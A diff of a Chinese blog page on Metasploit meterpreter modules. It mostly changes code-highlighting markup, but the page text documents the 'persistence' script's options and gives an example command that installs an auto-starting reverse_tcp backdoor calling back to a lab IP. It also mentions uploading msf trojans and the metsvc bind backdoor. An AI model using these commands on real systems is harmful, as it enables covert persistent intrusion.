@@ -12,9 +12,15 @@
 <meta name="generator" content="Hexo 5.4.2"></head>
 
 <link rel="stylesheet" href="../markdown.css">
-
+ 
 
 <link rel="stylesheet" href="../content.css">
+
+
+<link rel="stylesheet" href="../prism.css">
+
+
+<script src="../prism.js"></script>
 
     <style>
         #nav_list a:hover{
@@ -95,8 +101,20 @@
 <h2 id="各种模块"><a href="#各种模块" class="headerlink" title="各种模块:"></a>各种模块:</h2><blockquote>
 <p>使用方法:<code>meterpreter &gt; run [模块名称]</code></p>
 </blockquote>
-<h3 id="维持脚本之persistence"><a href="#维持脚本之persistence" class="headerlink" title="维持脚本之persistence"></a>维持脚本之persistence</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; run persistence -h<br>OPTIONS:<br>-A       #自动启动一个匹配的exploit / multi / handler来连接到代理<br>-L       #如果未使用％TEMP％，则在目标主机中写入有效负载的位置。<br>-P       #有效负载使用，默认为windows / meterpreter / reverse_tcp。<br>-S       #作为服务自动启动代理程序（具有SYSTEM权限）<br>-T       #要使用的备用可执行模板<br>-U       #用户登录时自动启动代理<br>-X       #系统引导时自动启动代理程序<br>-h       #这个帮助菜单<br>-i       #每次连接尝试之间的时间间隔（秒）<br>-p       #运行Metasploit的系统正在侦听的端口<br>-r       #运行Metasploit监听连接的系统的IP<br></code></pre></td></tr></table></figure>
-<p>例子:<br><code>run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141</code><br>注意,这个脚本生成的木马 <em>貌似/好像/大概/也许</em> 是一个16位的程序…最高也只能在32位系统里运行,<br>对于64位系统,可以自行再生成一个msf木马upload到靶机上去,一般情况下,其木马所在位置会在执行这个脚本时输出</p>
+<h3 id="维持脚本之persistence"><a href="#维持脚本之persistence" class="headerlink" title="维持脚本之persistence"></a>维持脚本之persistence</h3><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run persistence -h
+OPTIONS:
+-A       #自动启动一个匹配的exploit &#x2F; multi &#x2F; handler来连接到代理
+-L       #如果未使用％TEMP％，则在目标主机中写入有效负载的位置。
+-P       #有效负载使用，默认为windows &#x2F; meterpreter &#x2F; reverse_tcp。
+-S       #作为服务自动启动代理程序（具有SYSTEM权限）
+-T       #要使用的备用可执行模板
+-U       #用户登录时自动启动代理
+-X       #系统引导时自动启动代理程序
+-h       #这个帮助菜单
+-i       #每次连接尝试之间的时间间隔（秒）
+-p       #运行Metasploit的系统正在侦听的端口
+-r       #运行Metasploit监听连接的系统的IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例子:<br><code>run persistence -S -U -X -i 5 -p 6666 -r 192.168.190.141</code><br>注意,这个脚本生成的木马 <em>貌似&#x2F;好像&#x2F;大概&#x2F;也许</em> 是一个16位的程序…最高也只能在32位系统里运行,<br>对于64位系统,可以自行再生成一个msf木马upload到靶机上去,一般情况下,其木马所在位置会在执行这个脚本时输出</p>
 <h3 id="权限维持俩脚本之metsvc"><a href="#权限维持俩脚本之metsvc" class="headerlink" title="权限维持俩脚本之metsvc"></a>权限维持俩脚本之metsvc</h3><p>emmm,我不是很推荐用这个,这个脚本不是反向连接的,会在目标机上监听一个端口,随便一个谁去连接都是直接拿到权限,包括各种安全扫描工具…..</p>
 
             </div>
@@ -122,7 +140,7 @@
                 align-items: center;
                 /* width: fit-content; */
                 background-color: #f5f5f5;
-                margin: 0 auto;
+                margin: 0 auto 2em;
                 padding: 0.5rem;
                 border-radius: 1rem;
                 border: azure;
